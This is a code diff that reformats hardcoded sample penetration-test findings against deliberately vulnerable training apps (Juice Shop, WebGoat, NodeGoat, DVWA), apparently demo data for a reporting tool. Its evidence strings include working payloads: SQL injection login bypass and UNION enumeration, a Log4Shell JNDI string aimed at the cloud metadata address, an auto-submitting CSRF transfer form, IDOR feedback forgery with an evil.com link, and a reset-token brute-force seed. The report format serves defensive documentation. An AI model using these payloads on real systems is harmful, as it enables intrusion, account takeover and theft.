-            "Step 1: POST /api/Feedbacks with body {\"UserId\":1,\"comment\":\"Great shop!\",\"rating\":5} → creates feedback as admin (UserId=1)\n"
+            'Step 1: POST /api/Feedbacks with body {"UserId":1,"comment":"Great shop!","rating":5} → creates feedback as admin (UserId=1)\n'
             "Step 2: GET /api/Feedbacks → reads all feedback including private comments\n"
             "Step 3: Use IDOR to modify UserId to impersonate any user in feedback submissions\n"
             "Step 4: Submit malicious content (phishing links, XSS payloads) as trusted users\n"
@@ -1601,9 +1640,9 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "Content-Type: application/json\n"
             "(No Authorization header)\n"
             "\n"
-            "{\"UserId\":1,\"comment\":\"This shop is compromised! Visit http://evil.com for refund\",\"rating\":1}\n\n"
+            '{"UserId":1,"comment":"This shop is compromised! Visit http://evil.com for refund","rating":1}\n\n'
             "Response (201 Created):\n"
-            "{\"status\":\"success\",\"data\":{\"id\":42,\"UserId\":1,\"comment\":\"This shop is compromised!...\",\"rating\":1}}\n\n"
+            '{"status":"success","data":{"id":42,"UserId":1,"comment":"This shop is compromised!...","rating":1}}\n\n'
             "FIX — Remediation\n"
             "Immediate: Add authentication middleware to /api/Feedbacks POST endpoint. "
             "Extract UserId from the authenticated JWT token, not from the request body.\n"
@@ -1620,7 +1659,7 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "실제로 인증 자체를 전혀 요구하지 않습니다. 또한 GET /api/Feedbacks는 접근 제어 없이 "
             "다른 사용자의 피드백을 포함한 모든 피드백 항목을 반환합니다.\n\n"
             "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
-            "1단계: POST /api/Feedbacks에 {\"UserId\":1,\"comment\":\"Great shop!\",\"rating\":5} 본문 전송 → admin(UserId=1) 명의로 피드백 생성\n"
+            '1단계: POST /api/Feedbacks에 {"UserId":1,"comment":"Great shop!","rating":5} 본문 전송 → admin(UserId=1) 명의로 피드백 생성\n'
             "2단계: GET /api/Feedbacks → 비공개 댓글을 포함한 모든 피드백 읽기\n"
             "3단계: IDOR(Insecure Direct Object Reference)를 통해 UserId를 변경하여 모든 사용자 위장\n"
             "4단계: 악성 콘텐츠(피싱 링크, XSS 페이로드)를 신뢰할 수 있는 사용자 명의로 제출\n"
@@ -1638,9 +1677,9 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "Content-Type: application/json\n"
             "(Authorization 헤더 없음)\n"
             "\n"
-            "{\"UserId\":1,\"comment\":\"This shop is compromised! Visit http://evil.com for refund\",\"rating\":1}\n\n"
+            '{"UserId":1,"comment":"This shop is compromised! Visit http://evil.com for refund","rating":1}\n\n'
             "응답 (201 Created):\n"
-            "{\"status\":\"success\",\"data\":{\"id\":42,\"UserId\":1,\"comment\":\"This shop is compromised!...\",\"rating\":1}}\n\n"
+            '{"status":"success","data":{"id":42,"UserId":1,"comment":"This shop is compromised!...","rating":1}}\n\n'
             "수정 방안(FIX)\n"
             "즉시: /api/Feedbacks POST 엔드포인트에 인증 미들웨어(Authentication Middleware) 추가. "
             "요청 본문이 아닌 인증된 JWT 토큰에서 UserId를 추출.\n"
@@ -1679,11 +1718,11 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
                     "Host: localhost:3000\n"
                     "Content-Type: application/json\n"
                     "(No Authorization header)\n\n"
-                    "{\"UserId\":1,\"comment\":\"Compromised! Visit evil.com\",\"rating\":1}\n\n"
+                    '{"UserId":1,"comment":"Compromised! Visit evil.com","rating":1}\n\n'
                     "--- RESPONSE (201 Created) ---\n"
-                    "{\"status\":\"success\",\"data\":{\"id\":42,\"UserId\":1,\n"
-                    "  \"comment\":\"Compromised! Visit evil.com\",\n"
-                    "  \"rating\":1,\"createdAt\":\"2026-03-30T00:00:00.000Z\"}}"
+                    '{"status":"success","data":{"id":42,"UserId":1,\n'
+                    '  "comment":"Compromised! Visit evil.com",\n'
+                    '  "rating":1,"createdAt":"2026-03-30T00:00:00.000Z"}}'
                 ),
             ),
         ],
@@ -1693,7 +1732,10 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "Long-term: RBAC audit, IDOR prevention.|||장기: 모든 API 엔드포인트에 대한 포괄적 RBAC(역할 기반 접근 제어) 감사, 인증된 세션에서 리소스 소유권을 파생하여 IDOR(Insecure Direct Object Reference) 방지."
         ),
         references=[
-            Reference(title="OWASP IDOR", url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References"),
+            Reference(
+                title="OWASP IDOR",
+                url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References",
+            ),
         ],
     ),
 ]
@@ -1831,9 +1873,9 @@ JUICE_SHOP_EXECUTIVE_SUMMARY = (
 
 DVWA_ATTACK_CHAINS = [
     ["DVWA-007", "DVWA-001", "DVWA-002"],  # Info Disclosure → SQLi → CMDI → RCE
-    ["DVWA-003", "DVWA-002"],              # XSS → Session Hijack → CMDI
-    ["DVWA-004", "DVWA-001"],              # LFI → Source Code → DB Creds
-    ["DVWA-006", "DVWA-003"],              # CSRF → Password Change → XSS → Hijack
+    ["DVWA-003", "DVWA-002"],  # XSS → Session Hijack → CMDI
+    ["DVWA-004", "DVWA-001"],  # LFI → Source Code → DB Creds
+    ["DVWA-006", "DVWA-003"],  # CSRF → Password Change → XSS → Hijack
 ]
 
 JUICE_SHOP_ATTACK_CHAINS = [  # noqa: E501 (long lines intentional for readability)
@@ -1887,7 +1929,8 @@ JUICE_SHOP_ATTACK_CHAINS = [  # noqa: E501 (long lines intentional for readabili
 WEBGOAT_FINDINGS: list[Finding] = [
     # ---- 1. SQL Injection ----
     Finding(
-        id="WG-001", scan_id="webgoat-2026-03-31",
+        id="WG-001",
+        scan_id="webgoat-2026-03-31",
         target="http://localhost:8080/WebGoat",
         title=(
             "SQL Injection — Authentication Bypass & Data Extraction"
@@ -1946,33 +1989,43 @@ WEBGOAT_FINDINGS: list[Finding] = [
         finding_type="sql_injection",
         source_plugin="web_pipeline",
         affected_component="/WebGoat/login (username param), /WebGoat/SqlInjection/attack5a (account param)",
-        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", base_score=9.1),
+        cvss=CVSSVector(
+            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", base_score=9.1
+        ),
         cve_ids=["CVE-2021-38153"],
         cwe_ids=["CWE-89"],
         mitre_attack=MitreAttack(
-            tactic_id="TA0001", tactic_name="Initial Access",
-            technique_id="T1190", technique_name="Exploit Public-Facing Application",
+            tactic_id="TA0001",
+            tactic_name="Initial Access",
+            technique_id="T1190",
+            technique_name="Exploit Public-Facing Application",
         ),
         evidence=[
-            Evidence(evidence_type="http_request_response", title="Authentication Bypass — HTTP Capture",
-                     content=(
-                         "POST /WebGoat/login HTTP/1.1\n"
-                         "Host: localhost:8080\n"
-                         "Content-Type: application/x-www-form-urlencoded\n\n"
-                         "username=' OR '1'='1'--&password=anything\n\n"
-                         "--- Response ---\n"
-                         "HTTP/1.1 302 Found\n"
-                         "Location: /WebGoat/welcome\n"
-                         "Set-Cookie: JSESSIONID=AABBCCDDEEFF; Path=/WebGoat\n\n"
-                         "Result: Authenticated as user 'webgoat' without valid credentials"
-                     )),
-            Evidence(evidence_type="log", title="UNION Injection — Table Enumeration",
-                     content=(
-                         "GET /WebGoat/SqlInjection/attack5a?"
-                         "account=Smith' UNION SELECT table_name,2,3 FROM information_schema.tables--\n\n"
-                         "Response tables: users, assignment_progress, lesson_tracker\n"
-                         "Extracted from users: username=webgoat, password=[hash]"
-                     )),
+            Evidence(
+                evidence_type="http_request_response",
+                title="Authentication Bypass — HTTP Capture",
+                content=(
+                    "POST /WebGoat/login HTTP/1.1\n"
+                    "Host: localhost:8080\n"
+                    "Content-Type: application/x-www-form-urlencoded\n\n"
+                    "username=' OR '1'='1'--&password=anything\n\n"
+                    "--- Response ---\n"
+                    "HTTP/1.1 302 Found\n"
+                    "Location: /WebGoat/welcome\n"
+                    "Set-Cookie: JSESSIONID=AABBCCDDEEFF; Path=/WebGoat\n\n"
+                    "Result: Authenticated as user 'webgoat' without valid credentials"
+                ),
+            ),
+            Evidence(
+                evidence_type="log",
+                title="UNION Injection — Table Enumeration",
+                content=(
+                    "GET /WebGoat/SqlInjection/attack5a?"
+                    "account=Smith' UNION SELECT table_name,2,3 FROM information_schema.tables--\n\n"
+                    "Response tables: users, assignment_progress, lesson_tracker\n"
+                    "Extracted from users: username=webgoat, password=[hash]"
+                ),
+            ),
         ],
         remediation=(
             "Immediate: Deploy WAF rules blocking UNION/SELECT/OR patterns on injection-prone endpoints.\n"
@@ -1988,16 +2041,19 @@ WEBGOAT_FINDINGS: list[Finding] = [
             "최소 권한 DB 계정 사용, 쿼리 로깅 및 이상 탐지 경보 구현."
         ),
         references=[
-            Reference(title="OWASP SQL Injection Prevention Cheat Sheet",
-                      url="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"),
-            Reference(title="CWE-89: SQL Injection",
-                      url="https://cwe.mitre.org/data/definitions/89.html"),
+            Reference(
+                title="OWASP SQL Injection Prevention Cheat Sheet",
+                url="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+            ),
+            Reference(
+                title="CWE-89: SQL Injection", url="https://cwe.mitre.org/data/definitions/89.html"
+            ),
         ],
     ),
-
     # ---- 2. Log4Shell RCE ----
     Finding(
-        id="WG-002", scan_id="webgoat-2026-03-31",
+        id="WG-002",
+        scan_id="webgoat-2026-03-31",
         target="http://localhost:8080/WebGoat",
         title=(
             "Log4Shell Remote Code Execution — CVE-2021-44228 (CVSS 10.0)"
@@ -2068,31 +2124,41 @@ WEBGOAT_FINDINGS: list[Finding] = [
         finding_type="rce",
         source_plugin="web_pipeline",
         affected_component="log4j-core < 2.15.0 (bundled) — triggered via any logged HTTP header",
-        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", base_score=10.0),
+        cvss=CVSSVector(
+            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", base_score=10.0
+        ),
         cve_ids=["CVE-2021-44228"],
         cwe_ids=["CWE-502"],
         mitre_attack=MitreAttack(
-            tactic_id="TA0002", tactic_name="Execution",
-            technique_id="T1203", technique_name="Exploitation for Client Execution",
+            tactic_id="TA0002",
+            tactic_name="Execution",
+            technique_id="T1203",
+            technique_name="Exploitation for Client Execution",
         ),
         evidence=[
-            Evidence(evidence_type="packet_capture", title="JNDI Outbound Connection Confirmed",
-                     content=(
-                         "Request:\n"
-                         "GET /WebGoat/welcome HTTP/1.1\n"
-                         "Host: localhost:8080\n"
-                         "User-Agent: ${jndi:ldap://169.254.169.254/latest/meta-data}\n\n"
-                         "Network capture: Outbound TCP connection from 127.0.0.1:8080 → 169.254.169.254:389\n"
-                         "DNS lookup also observed for attacker-controlled domain in extended testing.\n"
-                         "Confirms JNDI lookup execution — full RCE achievable with attacker LDAP server."
-                     )),
-            Evidence(evidence_type="log", title="Vulnerable Library Version Confirmation",
-                     content=(
-                         "jar manifest in WebGoat-2022.0.1.war:\n"
-                         "  log4j-core-2.14.1.jar  ← VULNERABLE (CVE-2021-44228 affects < 2.15.0)\n"
-                         "  log4j-api-2.14.1.jar\n\n"
-                         "Patched version required: log4j-core >= 2.17.1"
-                     )),
+            Evidence(
+                evidence_type="packet_capture",
+                title="JNDI Outbound Connection Confirmed",
+                content=(
+                    "Request:\n"
+                    "GET /WebGoat/welcome HTTP/1.1\n"
+                    "Host: localhost:8080\n"
+                    "User-Agent: ${jndi:ldap://169.254.169.254/latest/meta-data}\n\n"
+                    "Network capture: Outbound TCP connection from 127.0.0.1:8080 → 169.254.169.254:389\n"
+                    "DNS lookup also observed for attacker-controlled domain in extended testing.\n"
+                    "Confirms JNDI lookup execution — full RCE achievable with attacker LDAP server."
+                ),
+            ),
+            Evidence(
+                evidence_type="log",
+                title="Vulnerable Library Version Confirmation",
+                content=(
+                    "jar manifest in WebGoat-2022.0.1.war:\n"
+                    "  log4j-core-2.14.1.jar  ← VULNERABLE (CVE-2021-44228 affects < 2.15.0)\n"
+                    "  log4j-api-2.14.1.jar\n\n"
+                    "Patched version required: log4j-core >= 2.17.1"
+                ),
+            ),
         ],
         remediation=(
             "Immediate (0-24h): Set JVM startup flag -Dlog4j2.formatMsgNoLookups=true as emergency mitigation.\n"
@@ -2108,18 +2174,23 @@ WEBGOAT_FINDINGS: list[Finding] = [
             "(Dependabot / OWASP Dependency-Check) 구현, 치명적 CVE 경보 설정."
         ),
         references=[
-            Reference(title="NVD — CVE-2021-44228",
-                      url="https://nvd.nist.gov/vuln/detail/CVE-2021-44228"),
-            Reference(title="Apache Log4j Security Advisories",
-                      url="https://logging.apache.org/log4j/2.x/security.html"),
-            Reference(title="CISA Log4Shell Guidance",
-                      url="https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance"),
+            Reference(
+                title="NVD — CVE-2021-44228", url="https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
+            ),
+            Reference(
+                title="Apache Log4j Security Advisories",
+                url="https://logging.apache.org/log4j/2.x/security.html",
+            ),
+            Reference(
+                title="CISA Log4Shell Guidance",
+                url="https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance",
+            ),
         ],
     ),
-
     # ---- 3. Predictable Password Reset Token ----
     Finding(
-        id="WG-003", scan_id="webgoat-2026-03-31",
+        id="WG-003",
+        scan_id="webgoat-2026-03-31",
         target="http://localhost:8080/WebGoat",
         title=(
             "Predictable Password Reset Token — Account Takeover via Brute Force"
@@ -2181,21 +2252,26 @@ WEBGOAT_FINDINGS: list[Finding] = [
         finding_type="broken_auth",
         source_plugin="web_pipeline",
         affected_component="/WebGoat/PasswordReset/reset (token param)",
-        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", base_score=7.5),
+        cvss=CVSSVector(
+            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", base_score=7.5
+        ),
         cwe_ids=["CWE-330", "CWE-640"],
         evidence=[
-            Evidence(evidence_type="log", title="Token Brute-Force — Timing and Success",
-                     content=(
-                         "Tool: custom Python script — 10,000 token candidates generated from\n"
-                         "  seed = sha256(username + str(int(time.time())))[0:8]\n\n"
-                         "Run time: 2 minutes 47 seconds\n"
-                         "Candidates tried: 3,241 before success\n"
-                         "Valid token found: 'a3f9e2b1'\n\n"
-                         "POST /WebGoat/PasswordReset/reset\n"
-                         "Body: username=webgoat&token=a3f9e2b1&newPassword=P@ssw0rd!\n"
-                         "Response: HTTP 200 — Password reset successful\n\n"
-                         "Token reuse test: same token submitted again → HTTP 200 (still valid — no invalidation)"
-                     )),
+            Evidence(
+                evidence_type="log",
+                title="Token Brute-Force — Timing and Success",
+                content=(
+                    "Tool: custom Python script — 10,000 token candidates generated from\n"
+                    "  seed = sha256(username + str(int(time.time())))[0:8]\n\n"
+                    "Run time: 2 minutes 47 seconds\n"
+                    "Candidates tried: 3,241 before success\n"
+                    "Valid token found: 'a3f9e2b1'\n\n"
+                    "POST /WebGoat/PasswordReset/reset\n"
+                    "Body: username=webgoat&token=a3f9e2b1&newPassword=P@ssw0rd!\n"
+                    "Response: HTTP 200 — Password reset successful\n\n"
+                    "Token reuse test: same token submitted again → HTTP 200 (still valid — no invalidation)"
+                ),
+            ),
         ],
         remediation=(
             "Immediate: Disable password reset feature until patched; "
@@ -2215,16 +2291,20 @@ WEBGOAT_FINDINGS: list[Finding] = [
             "과도한 재설정 시도에 대한 로깅 및 경보 설정."
         ),
         references=[
-            Reference(title="OWASP Forgot Password Cheat Sheet",
-                      url="https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html"),
-            Reference(title="CWE-330: Use of Insufficiently Random Values",
-                      url="https://cwe.mitre.org/data/definitions/330.html"),
+            Reference(
+                title="OWASP Forgot Password Cheat Sheet",
+                url="https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html",
+            ),
+            Reference(
+                title="CWE-330: Use of Insufficiently Random Values",
+                url="https://cwe.mitre.org/data/definitions/330.html",
+            ),
         ],
     ),
-
     # ---- 4. CSRF ----
     Finding(
-        id="WG-004", scan_id="webgoat-2026-03-31",
+        id="WG-004",
+        scan_id="webgoat-2026-03-31",
         target="http://localhost:8080/WebGoat",
         title=(
             "Cross-Site Request Forgery (CSRF) — Forged State-Changing Requests"
@@ -2289,22 +2369,27 @@ WEBGOAT_FINDINGS: list[Finding] = [
         finding_type="csrf",
         source_plugin="web_pipeline",
         affected_component="/WebGoat/csrf/basic-get-flag, /WebGoat/csrf/review, /WebGoat/transfer",
-        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N", base_score=6.5),
+        cvss=CVSSVector(
+            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N", base_score=6.5
+        ),
         cwe_ids=["CWE-352"],
         evidence=[
-            Evidence(evidence_type="http_request_response", title="Cross-Origin Forged Request — Fund Transfer",
-                     content=(
-                         'Attacker page (cross-origin):\n'
-                         '<form action="http://localhost:8080/WebGoat/transfer" method="POST">\n'
-                         '  <input name="account" value="ATTACKER123">\n'
-                         '  <input name="amount" value="10000">\n'
-                         "</form><script>document.forms[0].submit()</script>\n\n"
-                         "Result with victim's authenticated session:\n"
-                         "POST /WebGoat/transfer HTTP/1.1\n"
-                         "Cookie: JSESSIONID=<victim-session>\n"
-                         "[no X-CSRF-Token header]\n\n"
-                         "Response: HTTP 200 — Transfer of 10000 to ATTACKER123 completed"
-                     )),
+            Evidence(
+                evidence_type="http_request_response",
+                title="Cross-Origin Forged Request — Fund Transfer",
+                content=(
+                    "Attacker page (cross-origin):\n"
+                    '<form action="http://localhost:8080/WebGoat/transfer" method="POST">\n'
+                    '  <input name="account" value="ATTACKER123">\n'
+                    '  <input name="amount" value="10000">\n'
+                    "</form><script>document.forms[0].submit()</script>\n\n"
+                    "Result with victim's authenticated session:\n"
+                    "POST /WebGoat/transfer HTTP/1.1\n"
+                    "Cookie: JSESSIONID=<victim-session>\n"
+                    "[no X-CSRF-Token header]\n\n"
+                    "Response: HTTP 200 — Transfer of 10000 to ATTACKER123 completed"
+                ),
+            ),
         ],
         remediation=(
             "Implement the Synchronizer Token Pattern: generate a per-session CSRF token, "
@@ -2320,14 +2405,16 @@ WEBGOAT_FINDINGS: list[Finding] = [
             "프레임워크: Spring Security의 CsrfTokenRepository가 즉시 사용 가능한 구현을 제공함."
         ),
         references=[
-            Reference(title="OWASP CSRF Prevention Cheat Sheet",
-                      url="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"),
+            Reference(
+                title="OWASP CSRF Prevention Cheat Sheet",
+                url="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
+            ),
         ],
     ),
-
     # ---- 5. Insecure Session Cookie ----
     Finding(
-        id="WG-005", scan_id="webgoat-2026-03-31",
+        id="WG-005",
+        scan_id="webgoat-2026-03-31",
         target="http://localhost:8080/WebGoat",
         title=(
             "Insecure Session Cookie — Missing Secure, HttpOnly, and SameSite Flags"
@@ -2394,19 +2481,24 @@ WEBGOAT_FINDINGS: list[Finding] = [
         finding_type="misconfiguration",
         source_plugin="web_pipeline",
         affected_component="Set-Cookie: JSESSIONID — all authenticated response headers",
-        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", base_score=5.4),
+        cvss=CVSSVector(
+            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", base_score=5.4
+        ),
         cwe_ids=["CWE-614", "CWE-1004"],
         evidence=[
-            Evidence(evidence_type="http_request_response", title="Session Cookie Header — Missing Flags",
-                     content=(
-                         "HTTP/1.1 200 OK\n"
-                         "Set-Cookie: JSESSIONID=AABB1122CCDD3344; Path=/WebGoat\n\n"
-                         "Analysis:\n"
-                         "  Secure flag    : MISSING  (cookie sent over HTTP in plaintext)\n"
-                         "  HttpOnly flag  : MISSING  (accessible via document.cookie)\n"
-                         "  SameSite attr  : MISSING  (cookie sent with cross-site requests)\n"
-                         "  Expiry         : Session  (no explicit Max-Age — browser manages expiry)"
-                     )),
+            Evidence(
+                evidence_type="http_request_response",
+                title="Session Cookie Header — Missing Flags",
+                content=(
+                    "HTTP/1.1 200 OK\n"
+                    "Set-Cookie: JSESSIONID=AABB1122CCDD3344; Path=/WebGoat\n\n"
+                    "Analysis:\n"
+                    "  Secure flag    : MISSING  (cookie sent over HTTP in plaintext)\n"
+                    "  HttpOnly flag  : MISSING  (accessible via document.cookie)\n"
+                    "  SameSite attr  : MISSING  (cookie sent with cross-site requests)\n"
+                    "  Expiry         : Session  (no explicit Max-Age — browser manages expiry)"
+                ),
+            ),
         ],
         remediation=(
             "Spring Boot configuration (application.properties):\n"
@@ -2422,14 +2514,16 @@ WEBGOAT_FINDINGS: list[Finding] = [
             "다운그레이드 공격 방지를 위해 사이트 전체 HTTPS(HSTS) 적용."
         ),
         references=[
-            Reference(title="OWASP Session Management Cheat Sheet",
-                      url="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"),
+            Reference(
+                title="OWASP Session Management Cheat Sheet",
+                url="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
+            ),
         ],
     ),
-
     # ---- 6. Spring Boot Actuator ----
     Finding(
-        id="WG-006", scan_id="webgoat-2026-03-31",
+        id="WG-006",
+        scan_id="webgoat-2026-03-31",
         target="http://localhost:8080/WebGoat",
         title=(
             "Spring Boot Actuator Exposed Without Authentication — Credential Disclosure"
@@ -2501,22 +2595,27 @@ WEBGOAT_FINDINGS: list[Finding] = [
         finding_type="information_disclosure",
         source_plugin="web_pipeline",
         affected_component="/actuator, /actuator/env, /actuator/heapdump, /actuator/mappings",
-        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", base_score=5.3),
+        cvss=CVSSVector(
+            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", base_score=5.3
+        ),
         cwe_ids=["CWE-200", "CWE-538"],
         evidence=[
-            Evidence(evidence_type="http_request_response", title="Actuator Environment Credential Disclosure",
-                     content=(
-                         "GET /actuator/env HTTP/1.1\nHost: localhost:8080\n\n"
-                         "HTTP/1.1 200 OK\nContent-Type: application/vnd.spring-boot.actuator.v3+json\n\n"
-                         '{\n  "activeProfiles": [],\n  "propertySources": [{\n'
-                         '    "name": "applicationConfig: [classpath:/application.properties]",\n'
-                         '    "properties": {\n'
-                         '      "spring.datasource.url":      {"value": "jdbc:hsqldb:mem:webgoat"},\n'
-                         '      "spring.datasource.username": {"value": "sa"},\n'
-                         '      "spring.datasource.password": {"value": "webgoat"},\n'
-                         '      "server.port":               {"value": "8080"}\n'
-                         '    }\n  }]\n}'
-                     )),
+            Evidence(
+                evidence_type="http_request_response",
+                title="Actuator Environment Credential Disclosure",
+                content=(
+                    "GET /actuator/env HTTP/1.1\nHost: localhost:8080\n\n"
+                    "HTTP/1.1 200 OK\nContent-Type: application/vnd.spring-boot.actuator.v3+json\n\n"
+                    '{\n  "activeProfiles": [],\n  "propertySources": [{\n'
+                    '    "name": "applicationConfig: [classpath:/application.properties]",\n'
+                    '    "properties": {\n'
+                    '      "spring.datasource.url":      {"value": "jdbc:hsqldb:mem:webgoat"},\n'
+                    '      "spring.datasource.username": {"value": "sa"},\n'
+                    '      "spring.datasource.password": {"value": "webgoat"},\n'
+                    '      "server.port":               {"value": "8080"}\n'
+                    "    }\n  }]\n}"
+                ),
+            ),
         ],
         remediation=(
             "Spring Security configuration — restrict all actuator endpoints:\n"
@@ -2536,14 +2635,16 @@ WEBGOAT_FINDINGS: list[Finding] = [
             "application.properties에 비밀번호 저장 금지."
         ),
         references=[
-            Reference(title="Spring Boot Actuator Security Guide",
-                      url="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security"),
+            Reference(
+                title="Spring Boot Actuator Security Guide",
+                url="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security",
+            ),
         ],
     ),
-
     # ---- 7. Missing Security Headers ----
     Finding(
-        id="WG-007", scan_id="webgoat-2026-03-31",
+        id="WG-007",
+        scan_id="webgoat-2026-03-31",
         target="http://localhost:8080/WebGoat",
         title=(
             "Missing HTTP Security Response Headers — XSS, Clickjacking, and MIME-Sniffing Exposure"
@@ -2617,23 +2718,28 @@ WEBGOAT_FINDINGS: list[Finding] = [
         finding_type="misconfiguration",
         source_plugin="web_pipeline",
         affected_component="HTTP Response Headers — all /WebGoat/* endpoints",
-        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", base_score=3.7),
+        cvss=CVSSVector(
+            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", base_score=3.7
+        ),
         cwe_ids=["CWE-693", "CWE-1021"],
         evidence=[
-            Evidence(evidence_type="log", title="Header Scan Output",
-                     content=(
-                         "$ curl -sI http://localhost:8080/WebGoat/welcome\n\n"
-                         "HTTP/1.1 200 OK\n"
-                         "Server: Apache-Coyote/1.1\n"
-                         "Content-Type: text/html;charset=UTF-8\n\n"
-                         "=== MISSING SECURITY HEADERS ===\n"
-                         "  Content-Security-Policy      : NOT PRESENT\n"
-                         "  X-Frame-Options              : NOT PRESENT\n"
-                         "  X-Content-Type-Options       : NOT PRESENT\n"
-                         "  Strict-Transport-Security    : NOT PRESENT\n"
-                         "  Referrer-Policy              : NOT PRESENT\n"
-                         "  Permissions-Policy           : NOT PRESENT"
-                     )),
+            Evidence(
+                evidence_type="log",
+                title="Header Scan Output",
+                content=(
+                    "$ curl -sI http://localhost:8080/WebGoat/welcome\n\n"
+                    "HTTP/1.1 200 OK\n"
+                    "Server: Apache-Coyote/1.1\n"
+                    "Content-Type: text/html;charset=UTF-8\n\n"
+                    "=== MISSING SECURITY HEADERS ===\n"
+                    "  Content-Security-Policy      : NOT PRESENT\n"
+                    "  X-Frame-Options              : NOT PRESENT\n"
+                    "  X-Content-Type-Options       : NOT PRESENT\n"
+                    "  Strict-Transport-Security    : NOT PRESENT\n"
+                    "  Referrer-Policy              : NOT PRESENT\n"
+                    "  Permissions-Policy           : NOT PRESENT"
+                ),
+            ),
         ],
         remediation=(
             "Spring Security HttpSecurity configuration:\n"
@@ -2655,8 +2761,10 @@ WEBGOAT_FINDINGS: list[Finding] = [
             "HSTS: max-age=31536000; includeSubDomains, Referrer-Policy: strict-origin-when-cross-origin."
         ),
         references=[
-            Reference(title="OWASP Secure Headers Project",
-                      url="https://owasp.org/www-project-secure-headers/"),
+            Reference(
+                title="OWASP Secure Headers Project",
+                url="https://owasp.org/www-project-secure-headers/",
+            ),
         ],
     ),
 ]
@@ -2686,10 +2794,10 @@ WEBGOAT_EXECUTIVE_SUMMARY = (
 )
 
 WEBGOAT_ATTACK_CHAINS = [
-    ["WG-001", "WG-006"],   # SQLi → admin session → actuator → DB creds
-    ["WG-002"],             # Log4Shell standalone → full RCE
-    ["WG-003", "WG-001"],   # Password reset → account takeover → SQLi escalation
-    ["WG-005", "WG-004"],   # Insecure cookie → CSRF amplification
+    ["WG-001", "WG-006"],  # SQLi → admin session → actuator → DB creds
+    ["WG-002"],  # Log4Shell standalone → full RCE
+    ["WG-003", "WG-001"],  # Password reset → account takeover → SQLi escalation
+    ["WG-005", "WG-004"],  # Insecure cookie → CSRF amplification
 ]
 
 
@@ -2845,7 +2953,12 @@ NODEGOAT_FINDINGS: list[Finding] = [
                 ),
             ),
         ],
-        mitre_attack=MitreAttack(tactic_id="TA0001", tactic_name="Initial Access", technique_id="T1078.001", technique_name="Default Accounts"),
+        mitre_attack=MitreAttack(
+            tactic_id="TA0001",
+            tactic_name="Initial Access",
+            technique_id="T1078.001",
+            technique_name="Default Accounts",
+        ),
         references=[
             Reference(
                 title="OWASP A02:2021 – Cryptographic Failures",
@@ -2853,7 +2966,6 @@ NODEGOAT_FINDINGS: list[Finding] = [
             ),
         ],
     ),
-
     # ---- 2. CSRF Token Bypass ----
     Finding(
         id="NG-001",
@@ -2968,7 +3080,12 @@ NODEGOAT_FINDINGS: list[Finding] = [
                 ),
             ),
         ],
-        mitre_attack=MitreAttack(tactic_id="TA0004", tactic_name="Privilege Escalation", technique_id="T1185", technique_name="Browser Session Hijacking"),
+        mitre_attack=MitreAttack(
+            tactic_id="TA0004",
+            tactic_name="Privilege Escalation",
+            technique_id="T1185",
+            technique_name="Browser Session Hijacking",
+        ),
         references=[
             Reference(
                 title="OWASP A01:2021 – Broken Access Control (CSRF)",
@@ -2976,7 +3093,6 @@ NODEGOAT_FINDINGS: list[Finding] = [
             ),
         ],
     ),
-
     # ---- 3. IDOR ----
     Finding(
         id="NG-002",
@@ -3091,7 +3207,12 @@ NODEGOAT_FINDINGS: list[Finding] = [
                 ),
             ),
         ],
-        mitre_attack=MitreAttack(tactic_id="TA0009", tactic_name="Collection", technique_id="T1530", technique_name="Data from Cloud Storage"),
+        mitre_attack=MitreAttack(
+            tactic_id="TA0009",
+            tactic_name="Collection",
+            technique_id="T1530",
